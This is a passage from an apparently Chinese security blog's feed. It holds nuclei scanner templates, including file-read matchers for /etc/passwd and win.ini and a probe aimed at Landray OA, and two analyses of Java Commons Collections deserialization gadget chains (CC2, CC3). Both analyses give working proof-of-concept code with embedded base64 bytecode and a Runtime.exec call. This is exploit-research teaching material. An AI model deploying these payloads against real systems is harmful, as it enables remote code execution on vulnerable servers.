class="template-variable">&#123;&#123;num1&#125;&#125;</span>*<span class="template-variable">&#123;&#123;num2&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/(poc)<span class="template-variable">&#123;&#123;num1&#125;&#125;</span>*<span class="template-variable">&#123;&#123;num2&#125;&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">stop-at-first-match:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;result&#125;&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">id:</span> <span class="string">CNVD-xxx-xxxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">app=&quot;Landray</span> <span class="string">OA</span> <span class="string">system&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        POST /(poc路径) HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string">        Accept: */*</span></span><br><span class="line"><span class="string">        Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"></span><br><span class="line">        <span class="string">var=&#123;&quot;body&quot;:&#123;&quot;POST请求值&quot;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">stop-at-first-match:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;（需要匹配的特征值）&quot;</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">or</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">CNVD-xxx-xxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        POST /(poc)HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string">        Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"></span><br><span class="line">        <span class="string">（poc请求值）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;(需要匹配的值)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>&#x2F;etc&#x2F;passwd</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">matchers:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">     <span class="attr">regex:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;root:.*:0:0:&quot;</span></span><br><span class="line">     <span class="attr">part:</span> <span class="string">body</span></span><br></pre></td></tr></table></figure><p>C:&#x2F;windows&#x2F;win.ini</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">matchers:</span>    </span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">     <span class="attr">regex:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;bit app support&quot;</span></span><br><span class="line">     <span class="attr">part:</span> <span class="string">body</span></span><br></pre></td></tr></table></figure><p>匹配返回包中的值</p>]]></content>
    
    
    <summary type="html">nuclei常用templates模板</summary>
    
    
    
    <category term="Web安全" scheme="http://example.com/category/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java利用链CommonCollections2分析</title>
    <link href="http://example.com/posts/151175659.html"/>
    <id>http://example.com/posts/151175659.html</id>
    <published>2024-01-29T02:06:24.000Z</published>
    <updated>2024-06-20T09:03:38.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java利用链CommonCollections2分析"><a href="#Java利用链CommonCollections2分析" class="headerlink" title="Java利用链CommonCollections2分析"></a>Java利用链CommonCollections2分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Commons Collections有两个分支版本：</p><p><code>commons-collections:commons-collections </code></p><p><code>org.apache.commons:commons-collections4</code></p><p>在<code>commons-collections:commons-collections</code>可以使用的利用链在<code>org.apache.commons:commons-collections4</code>中都可以正常使用。在ysoserial中专门为CC4出了两条新的利用链CC2和CC4。</p><h2 id="ysoserial中的CC2"><a href="#ysoserial中的CC2" class="headerlink" title="ysoserial中的CC2"></a>ysoserial中的CC2</h2><p>先看下ysoserial中的CC2是怎么写的</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129101302220.png" alt="image-20240129101302220"></p><p>根据注释了解大概是通过PriorityQueue.readObject()进行反序列化到TransformingComparator.compare()完成整个利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><p>先看PriorityQueue的readObject，其中调用了heapify方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102110796.png" alt="image-20240129102110796"></p><p>heapify方法中调用了siftDown方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102145486.png" alt="image-20240129102145486"></p><p>siftDown方法中调用了siftDownUsingComparator方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102222646.png" alt="image-20240129102222646"></p><p>siftDownUsingComparator方法调用了comparator.compare方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102324130.png" alt="image-20240129102324130"></p><p>而comparator是我们在构造时传入的TransformingComparator</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102542427.png" alt="image-20240129102542427"></p><p>也就是执行了TransformingComparator.compare再看compare方法调用transformer.transofrm方法，传入的obj是queue拿出的对象</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102659856.png" alt="image-20240129102659856"></p><p>而transfomer也是在构造中传入的InvokerTransformer</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102818300.png" alt="image-20240129102818300"></p><p>到此已经有了完整利用链</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>需要注意queue中至少要有两个对象，所以add了两次，并且必须要add templatesImp对象否则没有newTransformer方法，在compare调用transform时会报错。也可以使用反射修改queue中的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADIAMwoABwAiCQAjACQIACUKACYAJwoAJgAoBwApBwAqAQAJdHJhbnNmb3JtAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHEx0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWDsBAANkb20BABxMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007AQAVc2VyaWFsaXphdGlvbkhhbmRsZXJzAQAxW0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACsBAHMoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO0xvcmcvYXBhY2hlL3htbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAPZHRtQXhpc0l0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAUc2VyaWFsaXphdGlvbkhhbmRsZXIBADBMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE1RlbXBsYXRlc0ltcGxYLmphdmEMABoAGwcALAwALQAuAQATdGVtcGxhdGVYIGNvbnN0cnVjdAcALwwAMAAxDAAwADIBABp0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABChJKVYAIQAGAAcAAAAAAAQAAQAIAAkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAAA0ADAAAACAAAwAAAAEADQAOAAAAAAABAA8AEAABAAAAAQARABIAAgATAAAABAABABQAAQAIABUAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABIADAAAACoABAAAAAEADQAOAAAAAAABAA8AEAABAAAAAQAWABcAAgAAAAEAGAAZAAMAEwAAAAQAAQAUAAEAGgAbAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAUAAQAFQAMABYADAAAAAwAAQAAAA0ADQAOAAAACQAcAB0AAQAKAAAAOAACAAEAAAAKsgACEQKatgAFsQAAAAIACwAAAAoAAgAAABkACQAaAAwAAAAMAAEAAAAKAB4AHwAAAAEAIAAAAAIAIQ==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tpi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">org</span>.apache.xalan.xsltc.trax.TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer));</span><br><span class="line"></span><br><span class="line">        queue.add(tpi);</span><br><span class="line">        queue.add(tpi);</span><br><span class="line"></span><br><span class="line">        setFieldValue(invokerTransformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);</span></span><br><span class="line"><span class="comment">//        queueArray[0] = tpi;</span></span><br><span class="line"><span class="comment">//        queueArray[1] = 1;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"><span class="comment">//        System.out.println(barr);</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129105550304.png" alt="image-20240129105550304"></p>]]></content>
    
    
    <summary type="html">Java利用链CommonCollections2分析</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>关于TemplatesImpl的Java利用链CommonCollections3</title>
    <link href="http://example.com/posts/461672887.html"/>
    <id>http://example.com/posts/461672887.html</id>
    <published>2024-01-25T11:44:42.000Z</published>
    <updated>2024-06-20T09:04:38.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java利用链CommonCollections3"><a href="#Java利用链CommonCollections3" class="headerlink" title="Java利用链CommonCollections3"></a>Java利用链CommonCollections3</h1><p>CommonCollections3利用了TemplatesImpl这条链</p><h2 id="CC3简易触发"><a href="#CC3简易触发" class="headerlink" title="CC3简易触发"></a>CC3简易触发</h2><p>结合CC1的Transformer触发方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用TemplatesImpl的newTransformer即可触发，修改POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADIAMwoABwAiCQAjACQIACUKACYAJwoAJgAoBwApBwAqAQAJdHJhbnNmb3JtAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHEx0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWDsBAANkb20BABxMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007AQAVc2VyaWFsaXphdGlvbkhhbmRsZXJzAQAxW0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACsBAHMoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO0xvcmcvYXBhY2hlL3htbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAPZHRtQXhpc0l0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAUc2VyaWFsaXphdGlvbkhhbmRsZXIBADBMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE1RlbXBsYXRlc0ltcGxYLmphdmEMABoAGwcALAwALQAuAQATdGVtcGxhdGVYIGNvbnN0cnVjdAcALwwAMAAxDAAwADIBABp0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABChJKVYAIQAGAAcAAAAAAAQAAQAIAAkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAAA0ADAAAACAAAwAAAAEADQAOAAAAAAABAA8AEAABAAAAAQARABIAAgATAAAABAABABQAAQAIABUAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABIADAAAACoABAAAAAEADQAOAAAAAAABAA8AEAABAAAAAQAWABcAAgAAAAEAGAAZAAMAEwAAAAQAAQAUAAEAGgAbAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAUAAQAFQAMABYADAAAAAwAAQAAAA0ADQAOAAAACQAcAB0AAQAKAAAAOAACAAEAAAAKsgACEQKatgAFsQAAAAIACwAAAAoAAgAAABkACQAaAAwAAAAMAAEAAAAKAB4AHwAAAAEAIAAAAAIAIQ==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tpi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">org</span>.apache.xalan.xsltc.trax.TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(tpi),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功触发</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125201700067.png" alt="image-20240125201700067"></p><h2 id="ysoserial中的CC3利用链"><a href="#ysoserial中的CC3利用链" class="headerlink" title="ysoserial中的CC3利用链"></a>ysoserial中的CC3利用链</h2><p>查看ysoserial中的CC3代码</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125201842918.png" alt="image-20240125201842918"></p><p>大体看上去和CC1的动态代理LazyMap触发的方式一样</p><p>CC3出现背景是有用SerialKill等对反序列化过滤的安全工具将一些类加入了黑名单，其中包括InvokerTransformer，为了绕过InvokerTransformer的限制出现了CC3。</p><p>绕过的方式为通过一个新的Transformer:</p><p> <code>org.apache.commons.collections.functors.InstantiateTransformer</code></p><p>它的transform是调用构造方法</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125202815838.png" 